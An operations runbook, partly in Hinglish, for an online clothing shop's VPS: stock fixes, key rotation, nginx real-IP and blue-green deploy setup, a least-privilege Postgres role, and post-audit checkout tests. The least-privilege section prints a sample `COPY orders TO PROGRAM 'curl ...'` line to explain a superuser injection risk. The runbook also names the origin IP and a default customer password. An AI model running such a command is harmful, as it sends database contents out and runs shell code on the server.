# Mahalaxmi — Pending Kaam Runbook
(Is file me koi secret nahi — repo public hai. Secrets sirf VPS appsettings.json / site_settings me.)

## 0. URGENT: 63 products "Out of Stock" dikha rahe hain — SQL chalao
Product page par har size grey, "OUT OF STOCK", BUY NOW band — 97 me se 63 products
par. Wajah: unke size/colour stock table me har cell 0 hai, jabki Total Qty 500 aur
status "In Stock" hai (Add/Edit form khaali table bhi save kar deta tha).

VPS par repo folder me (jahan docker-compose.yml hai):
```bash
git pull
docker exec -i mfh_postgres psql -U postgres -d mahalaxmi_fashionhub \
  < backend/Scripts/fix-blank-variant-stock.sql
```
Script pehle list print karta hai ki kaun se products theek honge, phir khaali table
hata deta hai. Jo products sach me sold out hain (status "Out of Stock") unhe chhuta
nahi. Koi stock number invent nahi hota.

**Ye SQL chalte hi live site theek — deploy/rebuild ki zarurat nahi.** Code ka fix
(dobara aisa na ho + storefront/backend dono ka safety net) agle normal deploy me
chala jayega.

## 0b. Google: 46 products ka colour reject ho raha hai (deploy ke baad)
Google `color` ko apparel ke liye zaruri maanta hai, aur "MultiColour" (42 products)
aur "Design C" (4 products) ko colour maanta hi nahi — ye items Shopping/free
listing me disapprove hain.

Frontend deploy ke baad:
1. Admin → **Products → 🎨 Colour Fix**. Sirf kharab wale 46 products dikhenge,
   photo ke saath.
2. Har product par **📷 Photo se colour bharo** dabayein — photo me se asli rang
   utha kar 3 circle bhar dega (Navy Blue/Red/Off White jaise).
3. Naam theek lage to **Save**, ya upar se **"Tayyar N save karo"** se sab ek saath.

Iske baad naye/edit hone wale products me galat colour save hi nahi hoga —
Add/Edit Product save rok kar wajah bata dega.

Spec: https://support.google.com/merchants/answer/6324487

## 1. SECURITY: JWT key (VPS pe)
```bash
ssh <vps>
openssl rand -base64 48          # ye output copy karo
sudo nano /var/www/mahalaxmi-backend/appsettings.json   # Jwt:Key me paste karo
pm2 restart mahalaxmi-api
```
Note: key badalte hi sab purane login tokens invalid — admin/customers ko dobara login karna hoga.

## 2. SECURITY: Razorpay + Delhivery keys rotate
1. Razorpay Dashboard → Settings → API Keys → **Regenerate Live Key**.
2. Nayi KeyId/KeySecret VPS appsettings.json (`Razorpay` section) me daalo.
3. Delhivery One panel → Settings → API Setup → token **regenerate**.
4. Naya token site_settings me daalo (niche step 3) — DelhiveryService wahi se uthata hai.
5. `pm2 restart mahalaxmi-api` → test payment + test AWB.

## 3. Delhivery settings (site_settings)
Option A — Admin panel → Settings me `delhivery_token` + `delhivery_pickup_name` set karo.
Option B — SQL: `database/set_delhivery_settings.sql` me values bharo, phir:
```bash
psql -U postgres -d mahalaxmi_fashionhub -f database/set_delhivery_settings.sql
```
(pickup_name = Delhivery panel me registered warehouse ka EXACT naam)

## 4. MSG91 Order SMS (code is commit me ready)
`SmsService.SendNewOrderSmsAsync` + OrdersController hook laga diya hai.
Jab tak `msg91OrderTemplateId` set nahi, SMS silently skip hota hai — deploy safe.

**DLT template banwao (MSG91 panel):**
- Type: Transactional / Service-Implicit
- Content suggestion:
  `Thank you for shopping with Mahalaxmi Fashion Hub! Your order ##order_id## of Rs ##amount## has been received. Track: mahalaxmifashionhub.com/tracking - MAHFHB`
- Variables `##order_id##`, `##amount##` (code var1/var2 fallback bhi bhejta hai)

**Approval ke baad** MSG91 me Flow banao, phir Admin → Settings me set karo:
- `msg91AuthKey` (agar OTP ke liye pehle se set hai to already hoga)
- `msg91OrderTemplateId` = naya flow/template ID
- `msg91SenderId` (DLT sender, e.g. MAHFHB)
Test COD order lagakar SMS verify karo.

## 4b. Cashfree Payment Gateway (PRIMARY)
Code ready hai — activate karne ke liye:
1. **DB migration (ek baar):**
```bash
psql -U postgres -d mahalaxmi_fashionhub -f database/migration_cashfree.sql
```
2. **Cashfree dashboard** (merchant.cashfree.com) → Developers → API Keys → App ID + Secret Key copy karo.
3. **VPS appsettings.json** me add karo:
```json
"Cashfree": { "AppId": "<app id>", "SecretKey": "<secret>", "Mode": "production" }
```
(test karna ho to pehle "Mode": "sandbox" + sandbox keys)
4. **Webhook** — Cashfree dashboard → Developers → Webhooks → URL:
`https://mahalaxmifashionhub.com/api/cashfree/webhook` (version 2023-08-01, Payment events)
5. `pm2 restart mahalaxmi-api` → test order lagao.

**Behaviour:** Pay Online = Cashfree first. Keys configured nahi → apne aap Razorpay chalega
(checkout kabhi nahi tootega). Force Razorpay karna ho: Admin → Settings → Payments →
paymentGateway = "razorpay".

## 5. Deploy
```bash
ssh <vps> && cd /var/www/mahalaxmi-nextjs && bash deploy.sh
```

## 6. Deploy ke baad verify
- Product page → F12 Console: `window.dataLayer.filter(e=>e.event==='view_item')`
- `https://mahalaxmifashionhub.com/feed/google-merchant.xml` → products XML
- `https://mahalaxmifashionhub.com/sitemap.xml` → product URLs
- Admin → 💰 Payment Reconcile → last 30 days chala ke dekho
- `pm2 logs mahalaxmi-api --lines 50`

## Clean the popup_leads duplicates already in the table (one time)

The code now keeps one row per person, but the rows saved before that are
still there — the same Dinesh twice, months apart, because the old check
only looked back 24 hours. Messaging a list like that sends the same person
the same offer twice, which is how a shop gets blocked on WhatsApp.

Look first, change nothing:

```sql
SELECT lower(email) AS e, regexp_replace(coalesce(phone,''), '\\D', '', 'g') AS p,
       count(*), min(created_at) AS first_seen
FROM popup_leads
GROUP BY 1, 2 HAVING count(*) > 1;
```

If that lists rows, keep the OLDEST of each and delete the rest:

```sql
DELETE FROM popup_leads a USING popup_leads b
WHERE a.id > b.id
  AND (
    (a.email IS NOT NULL AND lower(a.email) = lower(b.email))
    OR (a.phone IS NOT NULL AND regexp_replace(a.phone, '\\D', '', 'g')
                              = regexp_replace(b.phone, '\\D', '', 'g'))
  );
```

Take a backup first — this cannot be undone.

## Real client IP — DONE 3 Oct 2026

Done on the VPS, in this shape:

- `/etc/nginx/conf.d/cloudflare-realip.conf` holds 21 `set_real_ip_from`
  ranges fetched live from cloudflare.com, plus `real_ip_header
  CF-Connecting-IP;` and `real_ip_recursive on;`.
- `proxy_set_header CF-Connecting-IP $remote_addr;` was added beside the
  existing `X-Real-IP` line in every proxying location of all four files in
  `sites-enabled` (12 occurrences in the live config). nginx now overwrites
  the header rather than forwarding what arrived, so a value a visitor wrote
  never reaches the app.
- `nginx -t` passed, nginx reloaded, the site answered 200.
- Backup of the previous files: `/root/nginx-backup-2026-10-03-1709`.

Still open from this item: the firewall still allows 80/443 from anywhere,
so the origin is still reachable without going through Cloudflare. That is
now defence in depth rather than the hole itself.

To refresh the ranges later, re-run the generator in the deploy notes and
`systemctl reload nginx`.

### Original notes (kept for reference)


Every rate limit — password guesses, OTP sends — is counted per caller, and the
caller's identity comes from a header. The app now reads that header only when
the connection came from nginx on this same machine, and ignores it otherwise.
That closes the direct-to-port-5000 route. It does not, on its own, make the
header *true*: nginx still passes through whatever arrived.

Two things make it true.

**1. Let nginx work out the real address itself.** In the server block:

```nginx
# Cloudflare's published ranges — refresh from https://www.cloudflare.com/ips/
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 103.22.200.0/22;
set_real_ip_from 103.31.4.0/22;
set_real_ip_from 141.101.64.0/18;
set_real_ip_from 108.162.192.0/18;
set_real_ip_from 190.93.240.0/20;
set_real_ip_from 188.114.96.0/20;
set_real_ip_from 197.234.240.0/22;
set_real_ip_from 198.41.128.0/17;
set_real_ip_from 162.158.0.0/15;
set_real_ip_from 104.16.0.0/13;
set_real_ip_from 104.24.0.0/14;
set_real_ip_from 172.64.0.0/13;
set_real_ip_from 131.0.72.0/22;
set_real_ip_from 2400:cb00::/32;
set_real_ip_from 2606:4700::/32;
set_real_ip_from 2803:f800::/32;
set_real_ip_from 2405:b500::/32;
set_real_ip_from 2405:8100::/32;
set_real_ip_from 2a06:98c0::/29;
set_real_ip_from 2c0f:f248::/32;
real_ip_header CF-Connecting-IP;
real_ip_recursive on;
```

Now `$remote_addr` is the visitor, not Cloudflare, and a forged
`CF-Connecting-IP` from someone who is not Cloudflare is ignored.

**2. Overwrite the headers rather than forwarding what arrived**, in the
`location` that proxies to the API:

```nginx
proxy_set_header X-Real-IP        $remote_addr;
proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
proxy_set_header CF-Connecting-IP $remote_addr;
```

`proxy_set_header` replaces the incoming value, so a header the visitor wrote
never reaches the app.

**3. Shut the back door.** While the origin answers on its own IP
(147.93.104.150), anyone can skip Cloudflare entirely and talk to nginx
directly. Either allow only Cloudflare ranges in the firewall on 80/443, or run
`cloudflared` so the origin has no public port at all.

Check it afterwards: `pm2 logs mahalaxmi-api` while failing a login from a phone
on mobile data — the address it counts should be the phone's, not 127.0.0.1 and
not one you can change by sending a header.

## Rotate the push keys (the old private key is public)

`Program.cs` seeded the Web Push VAPID **private** key as a literal, and that
file is in a repository anyone can read. A VAPID private key is what proves a
notification came from this shop: whoever holds it can send push notifications
that land on our customers' phones wearing our name. It has been committed, so
it is burnt — changing the code does not un-publish it.

The code no longer carries any key. Push notifications stay off until the server
supplies a pair, which is the right way for a secret to be missing: visibly.

1. Generate a new pair on the server:

   ```bash
   npx web-push generate-vapid-keys
   ```

2. Put them in `/var/www/mahalaxmi-nextjs/backend/appsettings.json` (this file is
   NOT in git and the deploy script backs it up and restores it):

   ```json
   "Push": {
     "VapidPublicKey":  "<new public key>",
     "VapidPrivateKey": "<new private key>"
   }
   ```

3. Replace the rows that hold the old ones, so the running site picks the new
   pair up rather than the seeded values already in the database:

   ```sql
   UPDATE site_settings SET value = '<new public key>'  WHERE key = 'vapidPublicKey';
   UPDATE site_settings SET value = '<new private key>' WHERE key = 'vapidPrivateKey';
   ```

4. Restart: `pm2 restart mahalaxmi-api`.

Every phone that subscribed under the old public key stops receiving
notifications and has to allow them again — that is unavoidable, and it is the
smaller cost.

## Rate limiting - check this once after the next deploy

The limits are counted per caller, and who the caller is depends on the
deployment rather than on the code. If the API does not recognise the hop it
arrives through, every visitor in the world counts as one caller and the limits
either lock everybody out or protect nobody - and nothing in the logs says so.

One request answers it. From a phone, on mobile data:

    https://www.mahalaxmifashionhub.com/api/health/caller

Expected:

- `caller` is the phone's own public address (same as whatismyip shows)
- `trustedHop` is `true`
- `peer` is a private address (`172.x.x.x` on Docker, or `127.0.0.1`)

If `caller` equals `peer`, the hop is not being recognised: nginx is not
setting `CF-Connecting-IP`/`X-Real-IP` on that location, or the API is being
reached some other way. Fix that before trusting any of the limits.

Also worth confirming once, on the VPS, that the API is no longer answering
from outside - compose now publishes it on localhost only:

    curl -s -m 5 http://147.93.104.150:5000/api/health && echo REACHABLE || echo closed

`closed` is the correct answer.

## Does /api go through Node? Worth checking once

The shop has one API, so it does not need an API gateway product - nginx and
Cloudflare already are the single entry point, and splitting one .NET app into
microservices would add failure modes and buy nothing at this size.

What IS worth checking is whether API traffic takes an extra hop. There are two
possible routings and only one of them is right:

    browser -> Cloudflare -> nginx -> backend:5000                   (correct)
    browser -> Cloudflare -> nginx -> Next.js:3000 -> backend:5000   (a hop too many)

The second happens if nginx sends everything to port 3000, because
`frontend/next.config.js` has a rewrite forwarding `/api/:path*` to the backend.
That rewrite exists for local development. In production it would mean every API
call is proxied by the Node process, which then sits in front of the whole API
as an accidental gateway - one more thing to be slow, one more thing to restart,
one more place to run out of sockets.

On the VPS:

    grep -rn location /etc/nginx/sites-enabled/ | grep -i api

If no `location /api` block appears, API calls are going through Node. The fix
is a block sending them straight to the backend, placed ABOVE the catch-all:

    location /api/ {
        proxy_pass http://127.0.0.1:5000/api/;
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header CF-Connecting-IP  $remote_addr;
    }

The CF-Connecting-IP line is not optional - without it every rate limit counts
the whole shop as one caller. See the rate limiting section above.

## After the next deploy: read the endpoint audit

The API now prints, at startup, how many routes it answers and which of them
are public, change something, AND have no rate limit. On the VPS:

    docker compose logs backend | grep -i -A 10 'Endpoints:'

Expected: a count line, then `No public write endpoint is missing a rate limit.`
If routes are listed instead, each one should be deliberate - a payment webhook
verified by signature is fine, a login is not.

The same table is available to the owner at `/api/health/endpoints` (signed in
to the panel; it answers 404 to anybody else).

## Housekeeping

`backend/appsettings.json.before-jwt-rotation` is a backup from the JWT key
rotation. It is git-ignored and was never committed, so nothing leaked, but it
holds a retired signing key and has no further use. Worth deleting from the VPS
and from the working copy.

## Take the superuser away from the app — one job on the VPS

The API connects to Postgres as `postgres`, the cluster superuser. Every query
in the code is parameterised and none can be injected — that was checked line by
line, and `backend/Scripts/check-sql.py` now runs as part of `check-cs.sh` to
keep it true. But that is the first half of the answer; this is the second,
because they protect against different things.

Parameterising stops input from becoming SQL. This limits what SQL can do if
something ever does get through. As a superuser, SQL is not limited to the data:

    COPY orders TO PROGRAM 'curl -d @- http://somewhere'

`COPY ... PROGRAM` runs a **shell command on the VPS**. So an injection against
a superuser connection is not a data breach, it is a shell on the server. The
same role can also read `/etc/passwd`, read every password hash in `pg_authid`,
and `DROP DATABASE`. A plain role that merely owns its own tables can do none of
that, and the worst case shrinks from the server to this one database.

Steps, once:

    # 1. pick a long random password
    openssl rand -base64 24

    # 2. create the role and hand the tables over
    cd /path/to/mahalaxmi-nextjs
    docker compose exec -T postgres psql -U postgres -d mahalaxmi_fashionhub \
      -v app_password="'PASTE_THE_PASSWORD'" < database/least-privilege.sql

The script prints how many tables it moved and a table showing `is_superuser`
`false` for `mfh_app`. It is safe to re-run.

    # 3. point the backend at it, in the stack's .env
    APP_DB_USER=mfh_app
    APP_DB_PASSWORD=PASTE_THE_PASSWORD

    # 4. restart and read the log
    docker compose up -d backend
    docker compose logs backend | grep -i DbPrivileges

Expected: `Database user mfh_app is not a superuser.`
While it is unset, every boot logs a warning naming the risk — that is
deliberate, so this does not get quietly undone by a restore or a rebuild.

Two notes:

- **Both** variables must be set. The backend ignores one without the other
  rather than half-applying it, because falling back to the superuser over a
  missing password is the one failure that would look finished and not be.
- On a **fresh** install, `database/schema.sql` runs as `postgres` and the new
  tables are owned by `postgres` again, so the script has to be run once more
  after that.

## CORRECTION: production runs pm2, not docker-compose

Two items written earlier point at `docker-compose.yml`. The VPS does not use
it — `deploy.sh` does `dotnet publish` and runs both halves under **pm2**
(`mahalaxmi-api`, `mahalaxmi-frontend`). The compose file is for local work.
So:

- **The port binding.** Changing compose to `127.0.0.1:5000:5000` does nothing
  on the VPS. Under pm2 the API binds whatever `ASPNETCORE_URLS` says; unset,
  Kestrel uses `http://localhost:5000`, which is loopback only and fine. Check
  it once:

      pm2 env 0 | grep -i aspnetcore_urls      # or: pm2 describe mahalaxmi-api
      ss -lntp | grep 5000

  `127.0.0.1:5000` is correct. `0.0.0.0:5000` or `*:5000` means the API answers
  on the public IP past Cloudflare — fix by setting
  `ASPNETCORE_URLS=http://127.0.0.1:5000` in the pm2 environment.

- **The database role.** `APP_DB_USER` / `APP_DB_PASSWORD` must be in the pm2
  environment, not a compose `.env`:

      pm2 set mahalaxmi-api:APP_DB_USER mfh_app       # not persisted to env
      # simpler and what actually works: put them in start-api.sh before exec,
      # or in an ecosystem file, then: pm2 restart mahalaxmi-api --update-env

  Everything else in the least-privilege section still applies as written.

## Zero-downtime deploys — one-time setup

`deploy.sh` now releases the API into an idle slot and moves nginx across only
after the new one answers on its own port. Until the nginx side exists it
notices and falls back to the old restart-in-place deploy, so nothing breaks
before this is done.

**1. The upstream nginx will switch between**

    cat > /etc/nginx/conf.d/mfh-api-upstream.conf <<'EOF'
    upstream mfh_api { server 127.0.0.1:5001; }
    EOF

**2. Point the API location at it.** In the site file under
`/etc/nginx/sites-enabled/`, the `/api` block must proxy to the upstream rather
than to a port directly:

    location /api/ {
        proxy_pass http://mfh_api/api/;
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header CF-Connecting-IP  $remote_addr;
    }

Then `nginx -t && systemctl reload nginx`.

**3. Create the first slot** from what is already built and running:

    cp -a /var/www/mahalaxmi-backend /var/www/mahalaxmi-backend-blue
    ASPNETCORE_URLS=http://127.0.0.1:5001 pm2 start \
      /var/www/mahalaxmi-backend-blue/MahalaxmiApi \
      --name mfh-api-blue --cwd /var/www/mahalaxmi-backend-blue
    curl -fs http://127.0.0.1:5001/api/health && echo blue-OK
    echo blue > /var/www/mfh-live-colour
    pm2 save

Once `blue-OK` prints and the site is answering through nginx, the old
single-port process is no longer serving anything:

    pm2 delete mahalaxmi-api

**4. Frontend: cluster mode**, so `pm2 reload` replaces workers one at a time
instead of stopping the site:

    pm2 delete mahalaxmi-frontend
    cd /var/www/mahalaxmi-nextjs/frontend
    pm2 start npm --name mahalaxmi-frontend -i 2 --exec-mode cluster -- start
    pm2 save

Two workers is right for this VPS: enough to reload without a gap, not enough
to fight the API for CPU.

### Deploying after that

    bash deploy.sh              # releases into the idle slot, switches when healthy
    bash deploy.sh --rollback   # puts the previous slot back, about a second

The previous slot is deliberately left running — that is what makes going back
instant. It costs one idle .NET process worth of memory until the next deploy
reuses that slot. If the VPS is tight: `pm2 stop mfh-api-<old colour>`.

### What is deliberately NOT here

**Canary (sending 10% of traffic to the new version first).** nginx can do it
with weighted upstreams, but a canary is only worth having if there is enough
traffic to read a signal from in a few minutes, and someone watching error
rates split by version. At this shop's volume the health gate plus a one-second
rollback is the better trade; the canary would mostly add a way to be
half-deployed when something goes wrong at night.

**Two versions of the frontend served at once.** A browser that loaded a page
before the deploy asks for chunks from the old build, which the swap has
replaced, so that tab can break on its next navigation. The previous build is
kept as `.next-previous` already; serving it as a fallback for `/_next/static/`
would close this. Not done — say the word.

### The database rule this depends on

Two versions of the API are alive together for a few seconds, against one
database, and the new one applies its schema changes at boot while the old one
is still serving. So every change must be survivable by the version still
running: **add, never remove or tighten, in the same release**. Drop the old
column in a later one, once no running version remembers it.

`backend/Scripts/check-migrations.py` enforces this and runs as part of
`check-cs.sh`. A deliberate contract step is marked on the line:

    ALTER TABLE products DROP COLUMN old_price;  -- rolling-deploy: unused since v2.3

## Health checks and failover — what checks, and what acts

Two different jobs, and only the first one was done.

**Detecting** was already good. `/api/health` runs a real `SELECT 1` rather
than asking the pool whether it feels connected, checks free disk, and answers
503 naming the broken part. `HealthWatchdogService` repeats it every five
minutes and emails. Nothing to fix there.

**Acting on it** was missing. The nginx upstream named one slot:

    upstream mfh_api { server 127.0.0.1:5001; }

If that slot died, nginx kept posting every request at a dead port and every
shopper got 502 — while the other slot sat there running, able to answer. The
standby was there for rollback and did nothing the rest of the time.

Now `deploy.sh` writes it as:

    upstream mfh_api {
        server 127.0.0.1:5001 max_fails=3 fail_timeout=10s;
        server 127.0.0.1:5002 backup;
    }

Three failed requests in ten seconds and nginx stops using that server for ten
seconds. The other slot is `backup` — used only while the first is down, not
load balanced.

**Be clear about what that is: PASSIVE.** Open-source nginx learns a server is
dead by failing real requests at it, so up to three shoppers meet an error
first. Active checking — nginx polling `/api/health` itself and removing a
server before anyone meets it — is an nginx Plus feature.

### The free version of active checking

`health-watch.sh` polls both slots and moves the upstream before a customer
finds out. One line of cron:

    * * * * * /var/www/mahalaxmi-nextjs/health-watch.sh >> /var/log/mfh-health.log 2>&1

It is silent when all is well, so cron sends no mail. When the live slot stops
answering it asks once more three seconds later — a single missed check is a
garbage-collection pause or one slow query, and reloading nginx over that makes
things worse. Two in a row and it switches.

Two things it refuses to do:

- **Switch to a slot that is also unwell.** Moving traffic from a broken server
  to another broken server is motion, not a fix, and it loses the clue worth
  having. It logs both and stops.
- **Switch twice inside five minutes.** A flapping slot would otherwise have
  nginx reloading every minute while the shop is already struggling.

After an automatic failover the log says which slot went and tells you to find
out why before deploying again — an automatic recovery that nobody investigates
is a fault that comes back at a worse time.

### Still worth having: a check from OUTSIDE

Everything above runs on the VPS, so none of it can report the one failure that
matters most — the machine itself being down or unreachable. `/api/health` is
anonymous precisely so an outside service can poll it. UptimeRobot's free tier
checks every five minutes and is enough:

    https://www.mahalaxmifashionhub.com/api/health

Alert on anything that is not 200.

## 23 Oct 2026 — after the security + SEO audit (commits 0ac83e4, 3187c2b, 80ed338, 719c6a5)

Nothing here is code. These are the things only you can do.

**Test after deploy, in this order — all four touch money or the checkout:**

1. Place one real prepaid order through "Pay Online" (Cashfree). It must go through
   normally. Then place one WITH a coupon. If either is refused with "The amount does not
   match your cart", stop and tell me — that is the new floor in
   CashfreeController.CreateOrder being too strict, and the log line says exactly what it
   computed (`grep -i "create-order refused" <pm2 log>`).
2. If COD advance is switched on (Settings -> codAdvanceAmount is not 0), place one COD
   order too. It pays a part on purpose and is checked separately.
3. Open Settings as the owner and save. Every box must still hold its value - especially
   the Meta and Delhivery tokens. If any secret box is blank, DO NOT SAVE: tell me first.
4. Open a return in the admin Orders screen and check the video still plays and the
   View/Download links still work.

**Rotate these four. All carried over, none of them something I can do:**

- The Postgres password in the repo's git history (import_products.py, commit db4401b).
  The 9 Oct audit confirmed by hash that it is the password the live database uses today.
  Rewriting history does not help - assume it is burned.
- The Push VAPID private key (this file already says the old one is public).
- The OpenAI key in frontend/.env.production. The new /ai-chat limiter bounds further
  abuse; it does not undo what has already been spent.
- Razorpay and Delhivery keys.

**Two one-line cleanups:**

- `admin/customers/page.tsx` gives every admin-created customer the password `Mfh@12345`
  with no forced change. Decide what you want there and I will change it.
- Delete `fix_vps_products.py`, `import_products.py` and `reconcile_payments.py` from the
  working tree. The first overwrites two live source files with a July snapshot, no
  backup. The second adds 11 duplicate products every time it runs. The third writes a
  spreadsheet of customer emails and phone numbers into the repo root on the live server.

**The next real job, when you want it:** a coupon used on a prepaid order is still never
consumed - UsedCount does not move - so MaxUses and one-per-customer do not apply on the
main checkout. Fixing it means moving PlaceOrder's coupon rules so the Cashfree webhook can
run them too. About a hundred lines in the money path, so it wants its own session.

### Added after commit f87d259 — the prepaid checkout path changed

A fully prepaid Cashfree order now calls `ordersApi.place` on the way back from
the gateway, the same way a COD advance already did. That is a real change to the
busiest path in the shop, so test it before anything else:

1. One prepaid order, no coupon. It must reach the confirmation screen with an
   order number, and the order must appear in Admin -> Orders with the right
   subtotal and total (not the old round `fullTotal`).
2. One prepaid order WITH a coupon. Then open Admin -> Coupons: that code's
   "used" count must have gone up by one. Before this commit it never moved for
   a prepaid order. The order row must also show the code and the discount.
3. If you have a one-per-customer or limited-use code, try it twice from the
   same phone number. The second order should go through at full price.
4. A COD order with an advance, if advances are switched on - that path was
   working and must still work.

If a prepaid order pays but no order appears, the webhook is still behind it as
the safety net, so nothing is lost - but tell me, because it means PlaceOrder
refused the order and the reason is in the pm2 log.
